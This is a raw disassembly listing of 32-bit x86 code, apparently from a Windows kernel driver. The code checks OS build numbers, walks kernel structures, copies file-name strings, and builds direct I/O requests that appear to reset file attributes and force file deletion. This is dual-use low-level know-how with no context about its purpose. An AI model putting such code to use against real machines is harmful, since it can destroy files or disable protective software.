  4039ec:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4039f0:	eb 6e                	jmp    0x403a60
  4039f2:	3d 70 17 00 00       	cmp    $0x1770,%eax
  4039f7:	72 67                	jb     0x403a60
  4039f9:	83 7c 24 38 06       	cmpl   $0x6,0x38(%esp)
  4039fe:	72 60                	jb     0x403a60
  403a00:	8d 54 24 38          	lea    0x38(%esp),%edx
  403a04:	52                   	push   %edx
  403a05:	68 5c 64 40 00       	push   $0x40645c
  403a0a:	e8 d1 f6 ff ff       	call   0x4030e0
  403a0f:	85 c0                	test   %eax,%eax
  403a11:	75 2a                	jne    0x403a3d
  403a13:	8d 44 24 38          	lea    0x38(%esp),%eax
  403a17:	50                   	push   %eax
  403a18:	68 6c 64 40 00       	push   $0x40646c
  403a1d:	e8 be f6 ff ff       	call   0x4030e0
  403a22:	85 c0                	test   %eax,%eax
  403a24:	75 17                	jne    0x403a3d
  403a26:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  403a2a:	51                   	push   %ecx
  403a2b:	68 7c 64 40 00       	push   $0x40647c
  403a30:	e8 ab f6 ff ff       	call   0x4030e0
  403a35:	85 c0                	test   %eax,%eax
  403a37:	0f 84 a6 00 00 00    	je     0x403ae3
  403a3d:	8b f0                	mov    %eax,%esi
  403a3f:	e8 5c f7 ff ff       	call   0x4031a0
  403a44:	85 c0                	test   %eax,%eax
  403a46:	0f 84 97 00 00 00    	je     0x403ae3
  403a4c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403a50:	8d 54 24 10          	lea    0x10(%esp),%edx
  403a54:	52                   	push   %edx
  403a55:	51                   	push   %ecx
  403a56:	ff d0                	call   *%eax
  403a58:	85 c0                	test   %eax,%eax
  403a5a:	0f 8c 83 00 00 00    	jl     0x403ae3
  403a60:	8b 54 24 10          	mov    0x10(%esp),%edx
  403a64:	52                   	push   %edx
  403a65:	ff d7                	call   *%edi
  403a67:	84 c0                	test   %al,%al
  403a69:	74 78                	je     0x403ae3
  403a6b:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a6f:	66 83 78 30 00       	cmpw   $0x0,0x30(%eax)
  403a74:	74 6d                	je     0x403ae3
  403a76:	66 83 78 32 00       	cmpw   $0x0,0x32(%eax)
  403a7b:	74 66                	je     0x403ae3
  403a7d:	8b 40 34             	mov    0x34(%eax),%eax
  403a80:	50                   	push   %eax
  403a81:	ff d7                	call   *%edi
  403a83:	84 c0                	test   %al,%al
  403a85:	74 5c                	je     0x403ae3
  403a87:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a8b:	0f b7 48 30          	movzwl 0x30(%eax),%ecx
  403a8f:	83 c1 02             	add    $0x2,%ecx
  403a92:	81 f9 08 02 00 00    	cmp    $0x208,%ecx
  403a98:	77 49                	ja     0x403ae3
  403a9a:	8b 48 34             	mov    0x34(%eax),%ecx
  403a9d:	8b c1                	mov    %ecx,%eax
  403a9f:	8d 70 02             	lea    0x2(%eax),%esi
  403aa2:	66 8b 10             	mov    (%eax),%dx
  403aa5:	83 c0 02             	add    $0x2,%eax
  403aa8:	66 85 d2             	test   %dx,%dx
  403aab:	75 f5                	jne    0x403aa2
  403aad:	2b c6                	sub    %esi,%eax
  403aaf:	d1 f8                	sar    $1,%eax
  403ab1:	8d 54 00 02          	lea    0x2(%eax,%eax,1),%edx
  403ab5:	81 fa 08 02 00 00    	cmp    $0x208,%edx
  403abb:	77 26                	ja     0x403ae3
  403abd:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  403ac1:	81 c2 08 01 00 00    	add    $0x108,%edx
  403ac7:	0f b7 01             	movzwl (%ecx),%eax
  403aca:	66 89 02             	mov    %ax,(%edx)
  403acd:	83 c1 02             	add    $0x2,%ecx
  403ad0:	83 c2 02             	add    $0x2,%edx
  403ad3:	66 85 c0             	test   %ax,%ax
  403ad6:	75 ef                	jne    0x403ac7
  403ad8:	33 c0                	xor    %eax,%eax
  403ada:	5f                   	pop    %edi
  403adb:	5e                   	pop    %esi
  403adc:	5b                   	pop    %ebx
  403add:	83 c4 28             	add    $0x28,%esp
  403ae0:	c2 08 00             	ret    $0x8
  403ae3:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  403ae8:	5f                   	pop    %edi
  403ae9:	5e                   	pop    %esi
  403aea:	5b                   	pop    %ebx
  403aeb:	83 c4 28             	add    $0x28,%esp
  403aee:	c2 08 00             	ret    $0x8
  403af1:	cc                   	int3
  403af2:	cc                   	int3
  403af3:	cc                   	int3
  403af4:	cc                   	int3
  403af5:	cc                   	int3
  403af6:	cc                   	int3
  403af7:	cc                   	int3
  403af8:	cc                   	int3
  403af9:	cc                   	int3
  403afa:	cc                   	int3
  403afb:	cc                   	int3
  403afc:	cc                   	int3
  403afd:	cc                   	int3
  403afe:	cc                   	int3
  403aff:	cc                   	int3
  403b00:	83 ec 28             	sub    $0x28,%esp
  403b03:	53                   	push   %ebx
  403b04:	55                   	push   %ebp
  403b05:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  403b09:	33 c0                	xor    %eax,%eax
  403b0b:	56                   	push   %esi
  403b0c:	57                   	push   %edi
  403b0d:	8d 74 24 24          	lea    0x24(%esp),%esi
  403b11:	89 44 24 24          	mov    %eax,0x24(%esp)
  403b15:	89 44 24 28          	mov    %eax,0x28(%esp)
  403b19:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403b1d:	89 44 24 30          	mov    %eax,0x30(%esp)
  403b21:	89 44 24 34          	mov    %eax,0x34(%esp)
  403b25:	e8 f6 f6 ff ff       	call   0x403220
  403b2a:	85 c0                	test   %eax,%eax
  403b2c:	0f 8c e3 01 00 00    	jl     0x403d15
  403b32:	8b 5d 00             	mov    0x0(%ebp),%ebx
  403b35:	8d 44 24 18          	lea    0x18(%esp),%eax
  403b39:	50                   	push   %eax
  403b3a:	8b c6                	mov    %esi,%eax
  403b3c:	e8 0f fa ff ff       	call   0x403550
  403b41:	85 c0                	test   %eax,%eax
  403b43:	0f 8c cc 01 00 00    	jl     0x403d15
  403b49:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  403b4d:	51                   	push   %ecx
  403b4e:	8d 5c 24 18          	lea    0x18(%esp),%ebx
  403b52:	8d 7c 24 24          	lea    0x24(%esp),%edi
  403b56:	e8 15 1e 00 00       	call   0x405970
  403b5b:	85 c0                	test   %eax,%eax
  403b5d:	0f 8c b7 01 00 00    	jl     0x403d1a
  403b63:	8b 44 24 20          	mov    0x20(%esp),%eax
  403b67:	8b 3d 80 60 40 00    	mov    0x406080,%edi
  403b6d:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  403b74:	00 
  403b75:	3d 28 0a 00 00       	cmp    $0xa28,%eax
  403b7a:	75 22                	jne    0x403b9e
  403b7c:	83 7c 24 14 05       	cmpl   $0x5,0x14(%esp)
  403b81:	0f 85 ed 00 00 00    	jne    0x403c74
  403b87:	83 7c 24 1c 01       	cmpl   $0x1,0x1c(%esp)
  403b8c:	0f 85 e2 00 00 00    	jne    0x403c74
  403b92:	8b 54 24 18          	mov    0x18(%esp),%edx
  403b96:	8b b2 38 01 00 00    	mov    0x138(%edx),%esi
  403b9c:	eb 27                	jmp    0x403bc5
  403b9e:	3d ce 0e 00 00       	cmp    $0xece,%eax
  403ba3:	75 61                	jne    0x403c06
  403ba5:	83 7c 24 14 05       	cmpl   $0x5,0x14(%esp)
  403baa:	0f 85 c4 00 00 00    	jne    0x403c74
  403bb0:	83 7c 24 1c 02       	cmpl   $0x2,0x1c(%esp)
  403bb5:	0f 85 b9 00 00 00    	jne    0x403c74
  403bbb:	8b 54 24 18          	mov    0x18(%esp),%edx
  403bbf:	8b b2 24 01 00 00    	mov    0x124(%edx),%esi
  403bc5:	56                   	push   %esi
  403bc6:	ff d7                	call   *%edi
  403bc8:	84 c0                	test   %al,%al
  403bca:	0f 84 45 01 00 00    	je     0x403d15
  403bd0:	8b 76 14             	mov    0x14(%esi),%esi
  403bd3:	56                   	push   %esi
  403bd4:	ff d7                	call   *%edi
  403bd6:	84 c0                	test   %al,%al
  403bd8:	0f 84 37 01 00 00    	je     0x403d15
  403bde:	8b 06                	mov    (%esi),%eax
  403be0:	50                   	push   %eax
  403be1:	ff d7                	call   *%edi
  403be3:	84 c0                	test   %al,%al
  403be5:	0f 84 2a 01 00 00    	je     0x403d15
  403beb:	8b 0e                	mov    (%esi),%ecx
  403bed:	8b 51 24             	mov    0x24(%ecx),%edx
  403bf0:	52                   	push   %edx
  403bf1:	ff d7                	call   *%edi
  403bf3:	84 c0                	test   %al,%al
  403bf5:	0f 84 1a 01 00 00    	je     0x403d15
  403bfb:	8b 06                	mov    (%esi),%eax
  403bfd:	8b 48 24             	mov    0x24(%eax),%ecx
  403c00:	89 4c 24 3c          	mov    %ecx,0x3c(%esp)
  403c04:	eb 6e                	jmp    0x403c74
  403c06:	3d 70 17 00 00       	cmp    $0x1770,%eax
  403c0b:	72 67                	jb     0x403c74
  403c0d:	83 7c 24 14 06       	cmpl   $0x6,0x14(%esp)
  403c12:	72 60                	jb     0x403c74
  403c14:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  403c18:	52                   	push   %edx
  403c19:	68 5c 64 40 00       	push   $0x40645c
  403c1e:	e8 bd f4 ff ff       	call   0x4030e0
  403c23:	85 c0                	test   %eax,%eax
  403c25:	75 2a                	jne    0x403c51
  403c27:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403c2b:	50                   	push   %eax
  403c2c:	68 6c 64 40 00       	push   $0x40646c
  403c31:	e8 aa f4 ff ff       	call   0x4030e0
  403c36:	85 c0                	test   %eax,%eax
  403c38:	75 17                	jne    0x403c51
  403c3a:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  403c3e:	51                   	push   %ecx
  403c3f:	68 7c 64 40 00       	push   $0x40647c
  403c44:	e8 97 f4 ff ff       	call   0x4030e0
  403c49:	85 c0                	test   %eax,%eax
  403c4b:	0f 84 c4 00 00 00    	je     0x403d15
  403c51:	8b f0                	mov    %eax,%esi
  403c53:	e8 48 f5 ff ff       	call   0x4031a0
  403c58:	85 c0                	test   %eax,%eax
  403c5a:	0f 84 b5 00 00 00    	je     0x403d15
  403c60:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403c64:	8d 54 24 3c          	lea    0x3c(%esp),%edx
  403c68:	52                   	push   %edx
  403c69:	51                   	push   %ecx
  403c6a:	ff d0                	call   *%eax
  403c6c:	85 c0                	test   %eax,%eax
  403c6e:	0f 8c a1 00 00 00    	jl     0x403d15
  403c74:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  403c78:	52                   	push   %edx
  403c79:	ff d7                	call   *%edi
  403c7b:	84 c0                	test   %al,%al
  403c7d:	0f 84 92 00 00 00    	je     0x403d15
  403c83:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  403c87:	66 83 78 30 00       	cmpw   $0x0,0x30(%eax)
  403c8c:	0f 84 83 00 00 00    	je     0x403d15
  403c92:	66 83 78 32 00       	cmpw   $0x0,0x32(%eax)
  403c97:	74 7c                	je     0x403d15
  403c99:	8b 40 34             	mov    0x34(%eax),%eax
  403c9c:	50                   	push   %eax
  403c9d:	ff d7                	call   *%edi
  403c9f:	84 c0                	test   %al,%al
  403ca1:	74 72                	je     0x403d15
  403ca3:	8d b5 08 01 00 00    	lea    0x108(%ebp),%esi
  403ca9:	8b c6                	mov    %esi,%eax
  403cab:	8d 50 02             	lea    0x2(%eax),%edx
  403cae:	8b ff                	mov    %edi,%edi
  403cb0:	66 8b 08             	mov    (%eax),%cx
  403cb3:	83 c0 02             	add    $0x2,%eax
  403cb6:	66 85 c9             	test   %cx,%cx
  403cb9:	75 f5                	jne    0x403cb0
  403cbb:	2b c2                	sub    %edx,%eax
  403cbd:	d1 f8                	sar    $1,%eax
  403cbf:	8d 4c 00 02          	lea    0x2(%eax,%eax,1),%ecx
  403cc3:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  403cc7:	0f b7 50 32          	movzwl 0x32(%eax),%edx
  403ccb:	3b ca                	cmp    %edx,%ecx
  403ccd:	77 46                	ja     0x403d15
  403ccf:	8b 50 34             	mov    0x34(%eax),%edx
  403cd2:	8b ce                	mov    %esi,%ecx
  403cd4:	0f b7 01             	movzwl (%ecx),%eax
  403cd7:	66 89 02             	mov    %ax,(%edx)
  403cda:	83 c1 02             	add    $0x2,%ecx
  403cdd:	83 c2 02             	add    $0x2,%edx
  403ce0:	66 85 c0             	test   %ax,%ax
  403ce3:	75 ef                	jne    0x403cd4
  403ce5:	8b c6                	mov    %esi,%eax
  403ce7:	8d 50 02             	lea    0x2(%eax),%edx
  403cea:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403cf0:	66 8b 08             	mov    (%eax),%cx
  403cf3:	83 c0 02             	add    $0x2,%eax
  403cf6:	66 85 c9             	test   %cx,%cx
  403cf9:	75 f5                	jne    0x403cf0
  403cfb:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  403cff:	2b c2                	sub    %edx,%eax
  403d01:	d1 f8                	sar    $1,%eax
  403d03:	03 c0                	add    %eax,%eax
  403d05:	66 89 41 30          	mov    %ax,0x30(%ecx)
  403d09:	33 c0                	xor    %eax,%eax
  403d0b:	5f                   	pop    %edi
  403d0c:	5e                   	pop    %esi
  403d0d:	5d                   	pop    %ebp
  403d0e:	5b                   	pop    %ebx
  403d0f:	83 c4 28             	add    $0x28,%esp
  403d12:	c2 04 00             	ret    $0x4
  403d15:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  403d1a:	5f                   	pop    %edi
  403d1b:	5e                   	pop    %esi
  403d1c:	5d                   	pop    %ebp
  403d1d:	5b                   	pop    %ebx
  403d1e:	83 c4 28             	add    $0x28,%esp
  403d21:	c2 04 00             	ret    $0x4
  403d24:	cc                   	int3
  403d25:	cc                   	int3
  403d26:	cc                   	int3
  403d27:	cc                   	int3
  403d28:	cc                   	int3
  403d29:	cc                   	int3
  403d2a:	cc                   	int3
  403d2b:	cc                   	int3
  403d2c:	cc                   	int3
  403d2d:	cc                   	int3
  403d2e:	cc                   	int3
  403d2f:	cc                   	int3
  403d30:	56                   	push   %esi
  403d31:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403d35:	8b 46 28             	mov    0x28(%esi),%eax
  403d38:	8b 4e 18             	mov    0x18(%esi),%ecx
  403d3b:	89 08                	mov    %ecx,(%eax)
  403d3d:	8b 56 28             	mov    0x28(%esi),%edx
  403d40:	8b 46 1c             	mov    0x1c(%esi),%eax
  403d43:	6a 00                	push   $0x0
  403d45:	89 42 04             	mov    %eax,0x4(%edx)
  403d48:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  403d4b:	6a 00                	push   $0x0
  403d4d:	51                   	push   %ecx
  403d4e:	ff 15 cc 60 40 00    	call   *0x4060cc
  403d54:	56                   	push   %esi
  403d55:	ff 15 e4 60 40 00    	call   *0x4060e4
  403d5b:	b8 16 00 00 c0       	mov    $0xc0000016,%eax
  403d60:	5e                   	pop    %esi
  403d61:	c2 0c 00             	ret    $0xc
  403d64:	cc                   	int3
  403d65:	cc                   	int3
  403d66:	cc                   	int3
  403d67:	cc                   	int3
  403d68:	cc                   	int3
  403d69:	cc                   	int3
  403d6a:	cc                   	int3
  403d6b:	cc                   	int3
  403d6c:	cc                   	int3
  403d6d:	cc                   	int3
  403d6e:	cc                   	int3
  403d6f:	cc                   	int3
  403d70:	81 ec 84 00 00 00    	sub    $0x84,%esp
  403d76:	53                   	push   %ebx
  403d77:	55                   	push   %ebp
  403d78:	56                   	push   %esi
  403d79:	57                   	push   %edi
  403d7a:	50                   	push   %eax
  403d7b:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  403d7f:	51                   	push   %ecx
  403d80:	ff 15 18 60 40 00    	call   *0x406018
  403d86:	68 00 01 00 00       	push   $0x100
  403d8b:	33 db                	xor    %ebx,%ebx
  403d8d:	53                   	push   %ebx
  403d8e:	53                   	push   %ebx
  403d8f:	53                   	push   %ebx
  403d90:	53                   	push   %ebx
  403d91:	53                   	push   %ebx
  403d92:	6a 01                	push   $0x1
  403d94:	6a 04                	push   $0x4
  403d96:	68 80 00 00 00       	push   $0x80
  403d9b:	53                   	push   %ebx
  403d9c:	8d 44 24 48          	lea    0x48(%esp),%eax
  403da0:	50                   	push   %eax
  403da1:	8d 4c 24 7c          	lea    0x7c(%esp),%ecx
  403da5:	8d 54 24 54          	lea    0x54(%esp),%edx
  403da9:	51                   	push   %ecx
  403daa:	89 94 24 88 00 00 00 	mov    %edx,0x88(%esp)
  403db1:	68 80 00 00 00       	push   $0x80
  403db6:	8d 54 24 50          	lea    0x50(%esp),%edx
  403dba:	52                   	push   %edx
  403dbb:	c7 84 24 88 00 00 00 	movl   $0x18,0x88(%esp)
  403dc2:	18 00 00 00 
  403dc6:	89 9c 24 8c 00 00 00 	mov    %ebx,0x8c(%esp)
  403dcd:	c7 84 24 94 00 00 00 	movl   $0x240,0x94(%esp)
  403dd4:	40 02 00 00 
  403dd8:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  403ddf:	89 9c 24 9c 00 00 00 	mov    %ebx,0x9c(%esp)
  403de6:	ff 15 d0 60 40 00    	call   *0x4060d0
  403dec:	85 c0                	test   %eax,%eax
  403dee:	7d 1a                	jge    0x403e0a
  403df0:	68 ac 64 40 00       	push   $0x4064ac
  403df5:	e8 76 1c 00 00       	call   0x405a70
  403dfa:	83 c4 04             	add    $0x4,%esp
  403dfd:	33 c0                	xor    %eax,%eax
  403dff:	5f                   	pop    %edi
  403e00:	5e                   	pop    %esi
  403e01:	5d                   	pop    %ebp
  403e02:	5b                   	pop    %ebx
  403e03:	81 c4 84 00 00 00    	add    $0x84,%esp
  403e09:	c3                   	ret
  403e0a:	8b 0d d4 60 40 00    	mov    0x4060d4,%ecx
  403e10:	8b 11                	mov    (%ecx),%edx
  403e12:	53                   	push   %ebx
  403e13:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403e17:	50                   	push   %eax
  403e18:	8b 44 24 24          	mov    0x24(%esp),%eax
  403e1c:	53                   	push   %ebx
  403e1d:	52                   	push   %edx
  403e1e:	68 ff 01 1f 00       	push   $0x1f01ff
  403e23:	50                   	push   %eax
  403e24:	ff 15 e0 60 40 00    	call   *0x4060e0
  403e2a:	85 c0                	test   %eax,%eax
  403e2c:	7d 25                	jge    0x403e53
  403e2e:	68 c0 64 40 00       	push   $0x4064c0
  403e33:	e8 38 1c 00 00       	call   0x405a70
  403e38:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403e3c:	83 c4 04             	add    $0x4,%esp
  403e3f:	51                   	push   %ecx
  403e40:	ff 15 14 60 40 00    	call   *0x406014
  403e46:	33 c0                	xor    %eax,%eax
  403e48:	5f                   	pop    %edi
  403e49:	5e                   	pop    %esi
  403e4a:	5d                   	pop    %ebp
  403e4b:	5b                   	pop    %ebx
  403e4c:	81 c4 84 00 00 00    	add    $0x84,%esp
  403e52:	c3                   	ret
  403e53:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403e57:	ff 15 84 60 40 00    	call   *0x406084
  403e5d:	8b 54 24 18          	mov    0x18(%esp),%edx
  403e61:	52                   	push   %edx
  403e62:	ff 15 c4 60 40 00    	call   *0x4060c4
  403e68:	8b f8                	mov    %eax,%edi
  403e6a:	0f b6 47 30          	movzbl 0x30(%edi),%eax
  403e6e:	6a 01                	push   $0x1
  403e70:	50                   	push   %eax
  403e71:	ff 15 e8 60 40 00    	call   *0x4060e8
  403e77:	8b f0                	mov    %eax,%esi
  403e79:	3b f3                	cmp    %ebx,%esi
  403e7b:	75 1a                	jne    0x403e97
  403e7d:	68 dc 64 40 00       	push   $0x4064dc
  403e82:	e8 e9 1b 00 00       	call   0x405a70
  403e87:	83 c4 04             	add    $0x4,%esp
  403e8a:	33 c0                	xor    %eax,%eax
  403e8c:	5f                   	pop    %edi
  403e8d:	5e                   	pop    %esi
  403e8e:	5d                   	pop    %ebp
  403e8f:	5b                   	pop    %ebx
  403e90:	81 c4 84 00 00 00    	add    $0x84,%esp
  403e96:	c3                   	ret
  403e97:	8b 2d 58 60 40 00    	mov    0x406058,%ebp
  403e9d:	53                   	push   %ebx
  403e9e:	6a 01                	push   $0x1
  403ea0:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  403ea4:	51                   	push   %ecx
  403ea5:	ff d5                	call   *%ebp
  403ea7:	33 c0                	xor    %eax,%eax
  403ea9:	89 84 24 88 00 00 00 	mov    %eax,0x88(%esp)
  403eb0:	89 44 24 68          	mov    %eax,0x68(%esp)
  403eb4:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  403eb8:	89 44 24 70          	mov    %eax,0x70(%esp)
  403ebc:	89 44 24 74          	mov    %eax,0x74(%esp)
  403ec0:	89 44 24 78          	mov    %eax,0x78(%esp)
  403ec4:	89 44 24 7c          	mov    %eax,0x7c(%esp)
  403ec8:	89 84 24 80 00 00 00 	mov    %eax,0x80(%esp)
  403ecf:	89 84 24 84 00 00 00 	mov    %eax,0x84(%esp)
  403ed6:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%esp)
  403edd:	c7 84 24 88 00 00 00 	movl   $0x80,0x88(%esp)
  403ee4:	80 00 00 00 
  403ee8:	8d 54 24 68          	lea    0x68(%esp),%edx
  403eec:	8d 44 24 30          	lea    0x30(%esp),%eax
  403ef0:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  403ef4:	89 56 0c             	mov    %edx,0xc(%esi)
  403ef7:	89 46 2c             	mov    %eax,0x2c(%esi)
  403efa:	89 4e 28             	mov    %ecx,0x28(%esi)
  403efd:	8b 54 24 18          	mov    0x18(%esp),%edx
  403f01:	89 56 64             	mov    %edx,0x64(%esi)
  403f04:	ff 15 d8 60 40 00    	call   *0x4060d8
  403f0a:	89 46 50             	mov    %eax,0x50(%esi)
  403f0d:	8b 46 60             	mov    0x60(%esi),%eax
  403f10:	88 5e 20             	mov    %bl,0x20(%esi)
  403f13:	83 e8 24             	sub    $0x24,%eax
  403f16:	c6 00 06             	movb   $0x6,(%eax)
  403f19:	89 78 14             	mov    %edi,0x14(%eax)
  403f1c:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403f20:	89 48 18             	mov    %ecx,0x18(%eax)
  403f23:	c7 40 04 28 00 00 00 	movl   $0x28,0x4(%eax)
  403f2a:	c7 40 08 04 00 00 00 	movl   $0x4,0x8(%eax)
  403f31:	8b 54 24 18          	mov    0x18(%esp),%edx
  403f35:	89 50 0c             	mov    %edx,0xc(%eax)
  403f38:	8b 46 60             	mov    0x60(%esi),%eax
  403f3b:	83 e8 24             	sub    $0x24,%eax
  403f3e:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  403f42:	89 48 20             	mov    %ecx,0x20(%eax)
  403f45:	8b d6                	mov    %esi,%edx
  403f47:	8b cf                	mov    %edi,%ecx
  403f49:	c7 40 1c 30 3d 40 00 	movl   $0x403d30,0x1c(%eax)
  403f50:	c6 40 03 e0          	movb   $0xe0,0x3(%eax)
  403f54:	ff 15 90 60 40 00    	call   *0x406090
  403f5a:	53                   	push   %ebx
  403f5b:	6a 01                	push   $0x1
  403f5d:	53                   	push   %ebx
  403f5e:	53                   	push   %ebx
  403f5f:	8d 54 24 40          	lea    0x40(%esp),%edx
  403f63:	52                   	push   %edx
  403f64:	ff 15 78 60 40 00    	call   *0x406078
  403f6a:	53                   	push   %ebx
  403f6b:	6a 01                	push   $0x1
  403f6d:	8d 44 24 48          	lea    0x48(%esp),%eax
  403f71:	50                   	push   %eax
  403f72:	ff d5                	call   *%ebp
  403f74:	88 5c 24 17          	mov    %bl,0x17(%esp)
  403f78:	0f b6 4f 30          	movzbl 0x30(%edi),%ecx
  403f7c:	6a 01                	push   $0x1
  403f7e:	51                   	push   %ecx
  403f7f:	ff 15 e8 60 40 00    	call   *0x4060e8
  403f85:	8b 2d 14 60 40 00    	mov    0x406014,%ebp
  403f8b:	8b f0                	mov    %eax,%esi
  403f8d:	3b f3                	cmp    %ebx,%esi
  403f8f:	75 14                	jne    0x403fa5
  403f91:	68 f4 64 40 00       	push   $0x4064f4
  403f96:	e8 d5 1a 00 00       	call   0x405a70
  403f9b:	8b 54 24 20          	mov    0x20(%esp),%edx
  403f9f:	83 c4 04             	add    $0x4,%esp
  403fa2:	52                   	push   %edx
  403fa3:	ff d5                	call   *%ebp
  403fa5:	c6 44 24 17 01       	movb   $0x1,0x17(%esp)
  403faa:	8d 44 24 17          	lea    0x17(%esp),%eax
  403fae:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  403fb2:	8d 54 24 40          	lea    0x40(%esp),%edx
  403fb6:	89 46 0c             	mov    %eax,0xc(%esi)
  403fb9:	89 4e 28             	mov    %ecx,0x28(%esi)
  403fbc:	89 56 2c             	mov    %edx,0x2c(%esi)
  403fbf:	8b 44 24 18          	mov    0x18(%esp),%eax
  403fc3:	89 46 64             	mov    %eax,0x64(%esi)
  403fc6:	ff 15 d8 60 40 00    	call   *0x4060d8
  403fcc:	89 46 50             	mov    %eax,0x50(%esi)
  403fcf:	8b 46 60             	mov    0x60(%esi),%eax
  403fd2:	88 5e 20             	mov    %bl,0x20(%esi)
  403fd5:	83 e8 24             	sub    $0x24,%eax
  403fd8:	89 78 14             	mov    %edi,0x14(%eax)
  403fdb:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403fdf:	89 48 18             	mov    %ecx,0x18(%eax)
  403fe2:	c6 00 06             	movb   $0x6,(%eax)
  403fe5:	c7 40 04 01 00 00 00 	movl   $0x1,0x4(%eax)
  403fec:	c7 40 08 0d 00 00 00 	movl   $0xd,0x8(%eax)
  403ff3:	8b 54 24 18          	mov    0x18(%esp),%edx
  403ff7:	89 50 0c             	mov    %edx,0xc(%eax)
  403ffa:	8b 46 60             	mov    0x60(%esi),%eax
  403ffd:	83 e8 24             	sub    $0x24,%eax
  404000:	c7 40 1c 30 3d 40 00 	movl   $0x403d30,0x1c(%eax)
  404007:	c6 40 03 e0          	movb   $0xe0,0x3(%eax)
  40400b:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  40400f:	89 48 20             	mov    %ecx,0x20(%eax)
  404012:	8b 54 24 18          	mov    0x18(%esp),%edx
  404016:	8b 42 14             	mov    0x14(%edx),%eax
  404019:	8b d6                	mov    %esi,%edx
  40401b:	8b cf                	mov    %edi,%ecx
  40401d:	89 18                	mov    %ebx,(%eax)
  40401f:	89 58 08             	mov    %ebx,0x8(%eax)
  404022:	ff 15 90 60 40 00    	call   *0x406090
  404028:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40402c:	50                   	push   %eax
  40402d:	ff d5                	call   *%ebp
  40402f:	5f                   	pop    %edi
  404030:	5e                   	pop    %esi
  404031:	5d                   	pop    %ebp
  404032:	33 c0                	xor    %eax,%eax
  404034:	5b                   	pop    %ebx
  404035:	81 c4 84 00 00 00    	add    $0x84,%esp
  40403b:	c3                   	ret
  40403c:	cc                   	int3
  40403d:	cc                   	int3
  40403e:	cc                   	int3
  40403f:	cc                   	int3
  404040:	83 ec 08             	sub    $0x8,%esp
  404043:	53                   	push   %ebx
  404044:	56                   	push   %esi
  404045:	68 10 65 40 00       	push   $0x406510
  40404a:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40404e:	50                   	push   %eax
  40404f:	ff 15 18 60 40 00    	call   *0x406018
  404055:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  404059:	51                   	push   %ecx
  40405a:	ff 15 c0 60 40 00    	call   *0x4060c0
  404060:	8b 74 24 14          	mov    0x14(%esp),%esi
  404064:	8b 56 04             	mov    0x4(%esi),%edx
  404067:	52                   	push   %edx
  404068:	ff 15 c8 60 40 00    	call   *0x4060c8
  40406e:	a1 d8 9f 40 00       	mov    0x409fd8,%eax
  404073:	8b 1d cc 9f 40 00    	mov    0x409fcc,%ebx
  404079:	50                   	push   %eax
  40407a:	8b c6                	mov    %esi,%eax
  40407c:	e8 9f 16 00 00       	call   0x405720
  404081:	8b 0d dc 9f 40 00    	mov    0x409fdc,%ecx
  404087:	8b 1d d0 9f 40 00    	mov    0x409fd0,%ebx
  40408d:	51                   	push   %ecx
  40408e:	8b c6                	mov    %esi,%eax
  404090:	e8 8b 16 00 00       	call   0x405720
  404095:	8b 15 e0 9f 40 00    	mov    0x409fe0,%edx
  40409b:	8b 1d d4 9f 40 00    	mov    0x409fd4,%ebx
  4040a1:	52                   	push   %edx
  4040a2:	8b c6                	mov    %esi,%eax
  4040a4:	e8 77 16 00 00       	call   0x405720
  4040a9:	5e                   	pop    %esi
  4040aa:	5b                   	pop    %ebx
  4040ab:	83 c4 08             	add    $0x8,%esp
  4040ae:	c2 04 00             	ret    $0x4
  4040b1:	cc                   	int3
  4040b2:	cc                   	int3
  4040b3:	cc                   	int3
  4040b4:	cc                   	int3
  4040b5:	cc                   	int3
  4040b6:	cc                   	int3
  4040b7:	cc                   	int3
  4040b8:	cc                   	int3
  4040b9:	cc                   	int3
  4040ba:	cc                   	int3
  4040bb:	cc                   	int3
  4040bc:	cc                   	int3
  4040bd:	cc                   	int3
  4040be:	cc                   	int3
  4040bf:	cc                   	int3
  4040c0:	55                   	push   %ebp
  4040c1:	8b ec                	mov    %esp,%ebp
  4040c3:	83 e4 f8             	and    $0xfffffff8,%esp
  4040c6:	81 ec 14 03 00 00    	sub    $0x314,%esp
  4040cc:	53                   	push   %ebx
  4040cd:	56                   	push   %esi
  4040ce:	8b 75 0c             	mov    0xc(%ebp),%esi
  4040d1:	33 c9                	xor    %ecx,%ecx
  4040d3:	57                   	push   %edi
  4040d4:	bb 10 00 00 c0       	mov    $0xc0000010,%ebx
  4040d9:	3b f1                	cmp    %ecx,%esi
